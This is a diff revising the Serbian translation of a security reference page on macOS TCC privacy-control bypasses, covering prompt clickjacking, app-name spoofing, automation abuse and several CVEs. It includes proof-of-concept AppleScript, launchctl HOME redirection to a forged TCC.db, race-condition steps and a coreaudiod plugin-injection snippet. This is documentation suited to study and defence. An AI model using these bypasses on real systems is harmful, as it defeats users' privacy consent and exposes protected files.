@@ -6,7 +6,7 @@
 
 ### Write Bypass
 
-Ovo nije zaobilaženje, to je samo način na koji TCC funkcioniše: **Ne štiti od pisanja**. Ako Terminal **nema pristup za čitanje Desktop-a korisnika, i dalje može da piše u njega**:
+Ovo nije bypass, već samo način na koji TCC radi: **Ne štiti od upisivanja**. Ako Terminal **nema pristup čitanju Desktop-a korisnika, i dalje može da upisuje u njega**:
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -16,22 +16,23 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
-**Proširena atribut `com.apple.macl`** se dodaje novom **fajlu** kako bi se **aplikaciji kreatora** omogućio pristup za čitanje.
+**Prošireni atribut `com.apple.macl`** dodaje se novom **file-u** kako bi **creators app** dobio pristup čitanju tog file-a.
 
 ### TCC ClickJacking
 
-Moguće je **staviti prozor preko TCC prompta** kako bi korisnik **prihvatio** to bez da primeti. Možete pronaći PoC u [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**
+Moguće je **postaviti prozor preko TCC prompt-a** kako bi korisnik **prihvatio** zahtev, a da to ne primeti. PoC možete pronaći u [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**
 
 <figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
 
-### TCC zahtev po proizvoljnom imenu
+### TCC Request by arbitrary name
 
-Napadač može **napraviti aplikacije sa bilo kojim imenom** (npr. Finder, Google Chrome...) u **`Info.plist`** i učiniti da zatraži pristup nekoj TCC zaštićenoj lokaciji. Korisnik će pomisliti da je legitimna aplikacija ta koja traži ovaj pristup.\
-Štaviše, moguće je **ukloniti legitimnu aplikaciju iz Dock-a i staviti lažnu umesto nje**, tako da kada korisnik klikne na lažnu (koja može koristiti istu ikonu) može pozvati legitimnu, zatražiti TCC dozvole i izvršiti malver, navodeći korisnika da veruje da je legitimna aplikacija tražila pristup.
+Napadač može **kreirati aplikacije sa bilo kojim imenom** (npr. Finder, Google Chrome...) u **`Info.plist`** fajlu i učiniti da aplikacija zatraži pristup nekoj TCC zaštićenoj lokaciji. Korisnik će misliti da legitimna aplikacija zahteva ovaj pristup.\
+Pored toga, moguće je **ukloniti legitimnu aplikaciju iz Dock-a i postaviti lažnu aplikaciju na njeno mesto**, tako da, kada korisnik klikne na lažnu aplikaciju (koja može koristiti istu ikonu), ona može pozvati legitimnu aplikaciju, zatražiti TCC dozvole i izvršiti malware, navodeći korisnika da poveruje da je legitimna aplikacija zahtevala pristup.
 
 <figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>
 
-Više informacija i PoC u:
+Više informacija i PoC:
+
 
 {{#ref}}
 ../../../macos-privilege-escalation.md
@@ -39,48 +40,49 @@ Više informacija i PoC u:
 
 ### SSH Bypass
 
-Podrazumevano, pristup putem **SSH je imao "Full Disk Access"**. Da biste onemogućili ovo, potrebno je da bude navedeno, ali onemogućeno (uklanjanje sa liste neće ukloniti te privilegije):
+Podrazumevano, pristup putem **SSH-a ranije je imao "Full Disk Access"**. Da biste ga onemogućili, potrebno je da bude naveden, ali onemogućen (uklanjanje sa liste neće ukloniti te privilegije):
 
-![](<../../../../../images/image (1077).png>)
+![TCC Request by arbitrary name - SSH Bypass: Podrazumevano, pristup putem SSH-a ranije je imao "Full Disk Access". Da biste ga onemogućili, potrebno je da bude naveden, ali onemogućen (uklanjanje...](<../../../../../images/image (1077).png>)
 
-Ovde možete pronaći primere kako su neki **malveri uspeli da zaobiđu ovu zaštitu**:
+Ovde možete pronaći primere nekih **malware-a koji su uspeli da zaobiđu ovu zaštitu**:
 
 - [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
 
 > [!CAUTION]
-> Imajte na umu da sada, da biste mogli da omogućite SSH, potrebna vam je **Full Disk Access**
+> Imajte na umu da je sada, kako biste mogli da omogućite SSH, potreban **Full Disk Access**
 
 ### Handle extensions - CVE-2022-26767
 
-Atribut **`com.apple.macl`** se dodeljuje fajlovima kako bi se **određenoj aplikaciji omogućile dozvole za čitanje.** Ovaj atribut se postavlja kada se **prevuče i ispusti** fajl preko aplikacije, ili kada korisnik **duplo klikne** na fajl da bi ga otvorio sa **podrazumevanom aplikacijom**.
+Atribut **`com.apple.macl`** dodeljuje se file-ovima kako bi **određenoj aplikaciji dao dozvole za njihovo čitanje.** Ovaj atribut se postavlja kada se file **prevuče i otpusti** preko aplikacije ili kada korisnik **dvaput klikne** na file da bi ga otvorio pomoću **podrazumevane aplikacije**.
 
-Stoga, korisnik može **registrovati zloćudnu aplikaciju** da upravlja svim ekstenzijama i pozvati Launch Services da **otvori** bilo koji fajl (tako da će zloćudni fajl dobiti pristup za čitanje).
+Zbog toga bi korisnik mogao **registrovati malicious app** za rukovanje svim ekstenzijama i pozvati Launch Services da **otvori** bilo koji file (čime će malicious file dobiti pristup njegovom čitanju).
 
 ### iCloud
 
-Pravo **`com.apple.private.icloud-account-access`** omogućava komunikaciju sa **`com.apple.iCloudHelper`** XPC servisom koji će **obezbediti iCloud tokene**.
+Entitlement **`com.apple.private.icloud-account-access`** omogućava komunikaciju sa **`com.apple.iCloudHelper`** XPC servisom, koji će **obezbediti iCloud tokene**.
 
-**iMovie** i **Garageband** su imale ovo pravo i druge koje su to omogućavale.
+**iMovie** i **Garageband** imali su ovaj entitlement i druge entitlements koji su to omogućavali.
 
-Za više **informacija** o eksploatu za **dobijanje iCloud tokena** iz tog prava, pogledajte predavanje: [**#OBTS v5.0: "Šta se dešava na vašem Mac-u, ostaje na Apple-ovom iCloud-u?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Za više **informacija** o exploitu za **dobijanje iCloud tokena** pomoću ovog entitlement-a pogledajte predavanje: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
 
-### kTCCServiceAppleEvents / Automatizacija
+### kTCCServiceAppleEvents / Automation
 
-Aplikacija sa dozvolom **`kTCCServiceAppleEvents`** će moći da **kontroliše druge aplikacije**. To znači da bi mogla da **zloupotrebi dozvole dodeljene drugim aplikacijama**.
+Aplikacija sa dozvolom **`kTCCServiceAppleEvents`** moći će da **kontroliše druge aplikacije**. To znači da bi mogla da **zloupotrebi dozvole dodeljene drugim aplikacijama**.
 
-Za više informacija o Apple skriptama pogledajte:
+Za više informacija o Apple Scripts pogledajte:
+
 
 {{#ref}}
 macos-apple-scripts.md
 {{#endref}}
 
-Na primer, ako aplikacija ima **dozvolu za automatizaciju nad `iTerm`**, na primer u ovom primeru **`Terminal`** ima pristup nad iTerm:
+Na primer, ako aplikacija ima **Automation dozvolu nad `iTerm`-om**, kao u ovom primeru gde **`Terminal`** ima pristup iTerm-u:
 
 <figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>
 
-#### Preko iTerm
+#### Nad iTerm-om
 
-Terminal, koji nema FDA, može pozvati iTerm, koji ima, i koristiti ga za izvršavanje radnji:
+Terminal, koji nema FDA, može pozvati iTerm, koji ga ima, i koristiti ga za izvršavanje radnji:
 ```applescript:iterm.script
 tell application "iTerm"
 activate
@@ -96,9 +98,9 @@ end tell
 ```bash
 osascript iterm.script
 ```
-#### Preko Findera
+#### Preko Finder-a
 
-Ili ako aplikacija ima pristup preko Findera, mogla bi koristiti skriptu poput ove:
+Ili, ako App ima pristup preko Finder-a, može da pokrene skriptu kao što je ova:
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -108,14 +110,14 @@ set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alia
 end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
-## Po ponašanju aplikacije
+## Prema ponašanju aplikacije
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
 
-Korisnički **tccd daemon** koristi **`HOME`** **env** promenljivu za pristup TCC korisničkoj bazi podataka iz: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
+**`tccd daemon`** u **userland** okruženju koristi promenljivu **`HOME`** **env** za pristup korisničkoj TCC bazi podataka na lokaciji: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
 
-Prema [ovom Stack Exchange postu](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) i zato što TCC daemon radi putem `launchd` unutar domena trenutnog korisnika, moguće je **kontrolisati sve promenljive okruženja** koje se prosleđuju njemu.\
-Tako, **napadač može postaviti `$HOME` promenljivu okruženja** u **`launchctl`** da pokazuje na **kontrolisani** **direktorijum**, **ponovo pokrenuti** **TCC** daemon, i zatim **direktno izmeniti TCC bazu podataka** da sebi dodeli **svaku dostupnu TCC privilegiju** bez ikakvog obaveštavanja krajnjeg korisnika.\
+Prema [ovoj Stack Exchange objavi](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), a pošto se TCC daemon pokreće putem **`launchd`** unutar domena trenutnog korisnika, moguće je **kontrolisati sve environment variables** koje mu se prosleđuju.\
+Stoga bi **attacker mogao da postavi promenljivu `$HOME` environment** u **`launchctl`** tako da pokazuje na **kontrolisani** **direktorijum**, da ponovo pokrene **TCC** daemon, a zatim direktno izmeni **TCC bazu podataka** i sebi dodeli **svako dostupno TCC entitlement** bez ikakvog upita krajnjem korisniku.\
 PoC:
 ```bash
 # reset database just in case (no cheating!)
@@ -143,90 +145,92 @@ NULL,
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
-### CVE-2021-30761 - Beleške
+### CVE-2021-30761 - Notes
 
-Beleške su imale pristup TCC zaštićenim lokacijama, ali kada se beleška kreira, ona se **kreira na nezaštićenoj lokaciji**. Dakle, mogli biste tražiti od beleški da kopiraju zaštićenu datoteku u belešku (tako u nezaštićenoj lokaciji) i zatim pristupiti datoteci:
+Notes je imao pristup lokacijama zaštićenim pomoću TCC-a, ali kada se kreira note, ona se **kreira na nezaštićenoj lokaciji**. Zato je bilo moguće zatražiti od aplikacije Notes da kopira zaštićeni fajl u note (odnosno na nezaštićenu lokaciju), a zatim pristupiti tom fajlu:
 
 <figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>
 
-### CVE-2021-30782 - Translokacija
+### CVE-2021-30782 - Translocation
 
-Binarni fajl `/usr/libexec/lsd` sa bibliotekom `libsecurity_translocate` imao je pravo `com.apple.private.nullfs_allow` koje mu je omogućilo da kreira **nullfs** mount i imao je pravo `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`** za pristup svakoj datoteci.
+Binarni fajl `/usr/libexec/lsd`, sa bibliotekom `libsecurity_translocate`, imao je entitlement `com.apple.private.nullfs_allow`, koji mu je omogućavao kreiranje **nullfs** mount-a, kao i entitlement `com.apple.private.tcc.allow` sa **`kTCCServiceSystemPolicyAllFiles`**, koji mu je omogućavao pristup svakom fajlu.
 
-Bilo je moguće dodati atribut karantina na "Biblioteku", pozvati **`com.apple.security.translocation`** XPC servis i tada bi se Biblioteka mapirala na **`$TMPDIR/AppTranslocation/d/d/Library`** gde su svi dokumenti unutar Biblioteke mogli biti **pristupani**.
+Bilo je moguće dodati quarantine atribut na "Library", pozvati **`com.apple.security.translocation`** XPC service, nakon čega bi Library bio mapiran na **`$TMPDIR/AppTranslocation/d/d/Library`**, gde je bilo moguće **access**-ovati sve dokumente unutar Library-ja.
 
-### CVE-2023-38571 - Muzika i TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>
+### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>
 
-**`Muzika`** ima zanimljivu funkciju: Kada je u radu, **uvozi** datoteke koje su bačene u **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** u korisničku "medijsku biblioteku". Štaviše, poziva nešto poput: **`rename(a, b);`** gde su `a` i `b`:
+**`Music`** ima zanimljivu funkciju: kada je pokrenut, on će **import**-ovati fajlove ubačene u **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** u korisnikovu "media library". Pored toga, poziva nešto poput: **`rename(a, b);`**, gde su `a` i `b`:
 
 - `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
-- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`
+- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`
 
-Ovo **`rename(a, b);`** ponašanje je ranjivo na **Race Condition**, jer je moguće staviti lažni **TCC.db** fajl unutar foldera `Automatically Add to Music.localized` i zatim, kada se novi folder (b) kreira, kopirati datoteku, obrisati je i usmeriti je na **`~/Library/Application Support/com.apple.TCC`**/.
+Ovakvo ponašanje funkcije **`rename(a, b);`** ranjivo je na **Race Condition**, jer je moguće ubaciti lažni **TCC.db** fajl u folder `Automatically Add to Music.localized`, a zatim, kada se kreira novi folder (b), kopirati fajl, obrisati ga i uputiti ga na **`~/Library/Application Support/com.apple.TCC`**/.
+**More info** [**in the writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)
+
 
 ### SQLITE_SQLLOG_DIR - CVE-2023-32422
 
-Ako je **`SQLITE_SQLLOG_DIR="path/folder"`**, to u suštini znači da se **baza podataka koja je otvorena kopira na tu putanju**. U ovom CVE-u ova kontrola je zloupotrebljena da **piše** unutar **SQLite baze podataka** koja će biti **otvorena od strane procesa sa FDA TCC bazom podataka**, a zatim zloupotrebi **`SQLITE_SQLLOG_DIR`** sa **symlink-om u imenu fajla** tako da kada je ta baza podataka **otvorena**, korisnička **TCC.db se prepisuje** sa otvorenom.\
-**Više informacija** [**u izveštaju**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **i**[ **u predavanju**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).
+Ako je **`SQLITE_SQLLOG_DIR="path/folder"`** podešen, to u osnovi znači da se **svaka otvorena db** kopira na tu putanju. U ovom CVE-u, ova kontrola je zloupotrebljena za **write** unutar **SQLite baze** koju će otvoriti process sa FDA nad TCC bazom, a zatim je **`SQLITE_SQLLOG_DIR`** zloupotrebljen zajedno sa **symlink-om u nazivu fajla**, tako da se, kada se ta baza **otvori**, korisnikov **TCC.db prepiše** otvorenom bazom.\
+**More info** [**in the writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **and**[ **in the talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).
 
 ### **SQLITE_AUTO_TRACE**
 
-Ako je promenljiva okruženja **`SQLITE_AUTO_TRACE`** postavljena, biblioteka **`libsqlite3.dylib`** će početi da **beleži** sve SQL upite. Mnoge aplikacije su koristile ovu biblioteku, tako da je bilo moguće beležiti sve njihove SQLite upite.
+Ako je environment varijabla **`SQLITE_AUTO_TRACE`** podešena, biblioteka **`libsqlite3.dylib`** će početi da vrši **logging** svih SQL upita. Mnoge aplikacije su koristile ovu biblioteku, pa je bilo moguće logovati sve njihove SQLite upite.
 
-Nekoliko Apple aplikacija koristilo je ovu biblioteku za pristup TCC zaštićenim informacijama.
+Nekoliko Apple aplikacija koristilo je ovu biblioteku za pristup informacijama zaštićenim pomoću TCC-a.
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
 ### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407
 
-Ova **env varijabla se koristi od strane `Metal` framework-a** koji je zavisnost raznih programa, najistaknutije `Music`, koji ima FDA.
+Ova **env variable se koristi u `Metal` frameworku**, koji je dependency za različite programe, a najznačajniji je `Music`, koji ima FDA.
 
-Postavljanje sledećeg: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Ako je `path` važeći direktorijum, greška će se aktivirati i možemo koristiti `fs_usage` da vidimo šta se dešava u programu:
+Podešavanje sledećeg: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Ako je `path` validan direktorijum, bug će se aktivirati i možemo koristiti `fs_usage` da vidimo šta se dešava u programu:
 
-- fajl će biti `open()`ovan, nazvan `path/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
-- jedan ili više `write()` će zapisati sadržaj u fajl (mi to ne kontrolišemo)
-- `path/.dat.nosyncXXXX.XXXXXX` će biti `renamed()` u `path/name`
+- fajl će biti `open()`-ovan, pod nazivom `path/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
+- jedan ili više `write()` poziva će upisati sadržaj u fajl (mi ne kontrolišemo ovaj sadržaj)
+- `path/.dat.nosyncXXXX.XXXXXX` će biti `rename()`-ovan u `path/name`
 
-To je privremeno pisanje fajla, praćeno **`rename(old, new)`** **koje nije sigurno.**
+Ovo je upis privremenog fajla, nakon čega sledi **`rename(old, new)`**, **koji nije bezbedan.**
 
-Nije sigurno jer mora **da razreši stare i nove putanje odvojeno**, što može potrajati i može biti podložno uslovu trke. Za više informacija možete proveriti `xnu` funkciju `renameat_internal()`.
+Nije bezbedan zato što mora **zasebno da razreši stare i nove putanje**, što može potrajati i biti ranjivo na Race Condition. Za više informacija možete pogledati `xnu` funkciju `renameat_internal()`.
 
 > [!CAUTION]
-> Dakle, u suštini, ako privilegovani proces preimenuje iz foldera koji kontrolišete, mogli biste dobiti RCE i naterati ga da pristupi drugom fajlu ili, kao u ovom CVE-u, otvoriti fajl koji je privilegovana aplikacija kreirala i sačuvati FD.
+> Dakle, ako privilegovani proces vrši preimenovanje iz foldera koji kontrolišete, mogli biste dobiti RCE i naterati ga da pristupi drugom fajlu ili, kao u ovom CVE-u, otvoriti fajl koji je privilegovana aplikacija kreirala i sačuvati FD.
 >
-> Ako preimenovanje pristupa folderu koji kontrolišete, dok ste izmenili izvorni fajl ili imate FD za njega, menjate odredišni fajl (ili folder) da pokazuje na symlink, tako da možete pisati kad god želite.
+> Ako preimenovanje pristupa folderu koji kontrolišete, dok ste izmenili source fajl ili imate FD ka njemu, menjate destination fajl (ili folder) tako da pokazuje na symlink, pa možete upisivati kad god želite.
 
-Ovo je bio napad u CVE: Na primer, da bismo prepisali korisnikov `TCC.db`, možemo:
+Ovo je bio napad u ovom CVE-u. Na primer, da bismo prepisali korisnikov `TCC.db`, možemo:
 
-- kreirati `/Users/hacker/ourlink` da pokazuje na `/Users/hacker/Library/Application Support/com.apple.TCC/`
+- kreirati `/Users/hacker/ourlink` tako da pokazuje na `/Users/hacker/Library/Application Support/com.apple.TCC/`
 - kreirati direktorijum `/Users/hacker/tmp/`
 - postaviti `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
-- aktivirati grešku pokretanjem `Music` sa ovom env varijablom
-- uhvatiti `open()` od `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
-- ovde takođe `open()`ujemo ovaj fajl za pisanje, i zadržavamo deskriptor fajla
-- atomatski zameniti `/Users/hacker/tmp` sa `/Users/hacker/ourlink` **u petlji**
-- radimo ovo da bismo maksimizovali naše šanse za uspeh jer je prozor trke prilično mali, ali gubitak trke ima zanemarljiv nedostatak
-- malo sačekati
-- testirati da li smo imali sreće
-- ako ne, ponovo pokrenuti od vrha
+- aktivirati bug pokretanjem `Music` sa ovom env var
+- uhvatiti `open()` fajla `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X je nasumičan)
+- ovde takođe `open()`-ujemo ovaj fajl za upis i zadržavamo file descriptor
+- atomarno menjati `/Users/hacker/tmp` i `/Users/hacker/ourlink` **u petlji**
+- ovo radimo da bismo povećali šanse za uspeh, pošto je race window prilično mali, ali gubitak race-a ima zanemarljive posledice
+- sačekati malo
+- proveriti da li smo imali sreće
+- ako nismo, ponovo pokrenuti postupak od početka
 
 Više informacija na [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)
 
 > [!CAUTION]
-> Sada, ako pokušate da koristite env varijablu `MTL_DUMP_PIPELINES_TO_JSON_FILE`, aplikacije se neće pokrenuti
+> Ako sada pokušate da koristite env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE`, aplikacije se neće pokrenuti
 
 ### Apple Remote Desktop
 
-Kao root mogli biste omogućiti ovu uslugu i **ARD agent će imati pun pristup disku** koji bi zatim mogao biti zloupotrebljen od strane korisnika da napravi kopiju nove **TCC korisničke baze podataka**.
+Kao root mogli biste da omogućite ovaj service, a **ARD agent bi imao full disk access**, što bi korisnik zatim mogao da zloupotrebi kako bi naterao agent da kopira novu **TCC korisničku bazu**.
 
-## Po **NFSHomeDirectory**
+## By **NFSHomeDirectory**
 
-TCC koristi bazu podataka u korisnikovom HOME folderu da kontroliše pristup resursima specifičnim za korisnika na **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
-Stoga, ako korisnik uspe da ponovo pokrene TCC sa $HOME env varijablom koja pokazuje na **drugi folder**, korisnik bi mogao da kreira novu TCC bazu podataka u **/Library/Application Support/com.apple.TCC/TCC.db** i prevari TCC da dodeli bilo koju TCC dozvolu bilo kojoj aplikaciji.
+TCC koristi bazu u korisnikovom HOME folderu za kontrolu pristupa resursima specifičnim za korisnika, na lokaciji **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
+Zato, ako korisnik uspe da restartuje TCC sa $HOME env var koja pokazuje na **drugi folder**, mogao bi da kreira novu TCC bazu u **/Library/Application Support/com.apple.TCC/TCC.db** i prevari TCC da dodeli bilo koju TCC dozvolu bilo kojoj aplikaciji.
 
 > [!TIP]
-> Imajte na umu da Apple koristi podešavanje pohranjeno unutar korisničkog profila u **`NFSHomeDirectory`** atributu za **vrednost `$HOME`**, tako da ako kompromitujete aplikaciju sa dozvolama za izmenu ove vrednosti (**`kTCCServiceSystemPolicySysAdminFiles`**), možete **naoružati** ovu opciju sa TCC zaobilaženjem.
+> Imajte na umu da Apple koristi podešavanje sačuvano u korisničkom profilu, u atributu **`NFSHomeDirectory`**, za **vrednost `$HOME`**. Zato, ako kompromitujete aplikaciju koja ima dozvole da menja ovu vrednost (**`kTCCServiceSystemPolicySysAdminFiles`**), ovu opciju možete **weaponize** pomoću TCC bypass-a.
 
 ### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>
 
@@ -234,45 +238,45 @@ Stoga, ako korisnik uspe da ponovo pokrene TCC sa $HOME env varijablom koja poka
 
 ### CVE-2021-30970 - Powerdir
 
-**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) da izmeni **HOME** folder korisnika.
+**Prvi POC** koristi [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) i [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) za izmenu korisnikovog **HOME** foldera.
 
-1. Dobiti _csreq_ blob za ciljanju aplikaciju.
-2. Postaviti lažni _TCC.db_ fajl sa potrebnim pristupom i _csreq_ blob.
-3. Izvesti korisnički Directory Services unos sa [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
-4. Izmeniti Directory Services unos da promeni korisnikov home direktorijum.
-5. Uvesti izmenjeni Directory Services unos sa [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
-6. Zaustaviti korisnikov _tccd_ i ponovo pokrenuti proces.
+1. Preuzeti _csreq_ blob za ciljnu aplikaciju.
+2. Postaviti lažni _TCC.db_ fajl sa potrebnim pristupom i _csreq_ blob-om.
+3. Exportovati korisnikov Directory Services unos pomoću [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
+4. Izmeniti Directory Services unos kako bi se promenio korisnikov home directory.
+5. Importovati izmenjeni Directory Services unos pomoću [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
+6. Zaustaviti korisnikov _tccd_ i rebootovati proces.
 
-Drugi POC je koristio **`/usr/libexec/configd`** koji je imao `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
-Bilo je moguće pokrenuti **`configd`** sa **`-t`** opcijom, napadač je mogao da specificira **prilagođeni Bundle za učitavanje**. Stoga, eksploatacija **menja** **`dsexport`** i **`dsimport`** metodu promene korisnikovog home direktorijuma sa **`configd` kod injekcije**.
+Drugi POC je koristio **`/usr/libexec/configd`**, koji je imao `com.apple.private.tcc.allow` sa vrednošću `kTCCServiceSystemPolicySysAdminFiles`.\
+Bilo je moguće pokrenuti **`configd`** sa opcijom **`-t`**, pri čemu je attacker mogao da navede **custom Bundle za učitavanje**. Zato exploit **zamenjuje** metod promene korisnikovog home directory-ja pomoću **`dsexport`** i **`dsimport`** sa **`configd` code injection** tehnikom.
 
-Za više informacija proverite [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).
+Za više informacija pogledajte [**originalni report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).
 
-## Po injekciji procesa
+## By process injection
 
-Postoje različite tehnike za injekciju koda unutar procesa i zloupotrebu njegovih TCC privilegija:
+Postoje različite tehnike za ubacivanje koda u proces i zloupotrebu njegovih TCC privilegija:
 
 
 {{#ref}}
 ../../../macos-proces-abuse/
 {{#endref}}
 
-Štaviše, najčešća injekcija procesa za zaobilaženje TCC-a je putem **plugin-a (load library)**.\
-Plugin-ovi su dodatni kod obično u obliku biblioteka ili plist, koji će biti **učitani od strane glavne aplikacije** i izvršavaće se pod njenim kontekstom. Stoga, ako je glavna aplikacija imala pristup TCC ograničenim fajlovima (putem dodeljenih dozvola ili prava), **prilagođeni kod će takođe imati pristup**.
+Štaviše, najčešći process injection za bypass TCC-a je putem **plugins (load library)**.\
+Plugins su dodatni kod, obično u obliku library fajlova ili plist-a, koji će biti **učitani od strane glavne aplikacije** i izvršavaće se u njenom kontekstu. Zato, ako je glavna aplikacija imala pristup fajlovima ograničenim pomoću TCC-a (putem dodeljenih dozvola ili entitlements), **custom code će ga takođe imati**.
 
 ### CVE-2020-27937 - Directory Utility
 
-Aplikacija `/System/Library/CoreServices/Applications/Directory Utility.app` imala je pravo **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala je plugin-ove sa **`.daplug`** ekstenzijom i **nije imala** pojačanu runtime zaštitu.
+Aplikacija `/System/Library/CoreServices/Applications/Directory Utility.app` imala je entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, učitavala je plugins sa ekstenzijom **`.daplug`** i **nije imala hardened** runtime.
 
-Da bi se naoružao ovaj CVE, **`NFSHomeDirectory`** je **promenjen** (zloupotrebljavajući prethodno pravo) kako bi mogao da **preuzme korisničku TCC bazu podataka** za zaobilaženje TCC-a.
+Da bi se ovaj CVE weaponize-ovao, **`NFSHomeDirectory`** se **menja** (zloupotrebom prethodno navedenog entitlement-a), kako bi bilo moguće **preuzeti kontrolu nad korisnikovom TCC bazom** i zaobići TCC.
 
-Za više informacija proverite [**originalni izveštaj**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
+Za više informacija pogledajte [**originalni report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
 
 ### CVE-2020-29621 - Coreaudiod
 
-Binarni fajl **`/usr/sbin/coreaudiod`** imao je prava `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prvo **dozvoljava injekciju koda** a drugo mu daje pristup da **upravlja TCC-om**.
+Binary **`/usr/sbin/coreaudiod`** imao je entitlements `com.apple.security.cs.disable-library-validation` i `com.apple.private.tcc.manager`. Prvi je **omogućavao code injection**, a drugi mu je davao pristup za **upravljanje TCC-om**.
 
-Ovaj binarni fajl je omogućio učitavanje **plugin-ova trećih strana** iz foldera `/Library/Audio/Plug-Ins/HAL`. Stoga, bilo je moguće **učitati plugin i zloupotrebiti TCC dozvole** sa ovim PoC:
+Ovaj binary je omogućavao učitavanje **third party plug-ins** iz foldera `/Library/Audio/Plug-Ins/HAL`. Zato je bilo moguće **učitati plugin i zloupotrebiti TCC dozvole** pomoću ovog POC-a:
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -299,19 +303,19 @@ add_tcc_entry();
 NSLog(@"[+] Exploitation finished...");
 exit(0);
 ```
-Za više informacija pogledajte [**originalni izveštaj**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
+Za više informacija pogledajte [**original report**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).
 
 ### Device Abstraction Layer (DAL) Plug-Ins
 
-Sistemske aplikacije koje otvaraju kameru putem Core Media I/O (aplikacije sa **`kTCCServiceCamera`**) učitavaju **u procesu ove plug-inove** smeštene u `/Library/CoreMediaIO/Plug-Ins/DAL` (nije pod SIP restrikcijama).
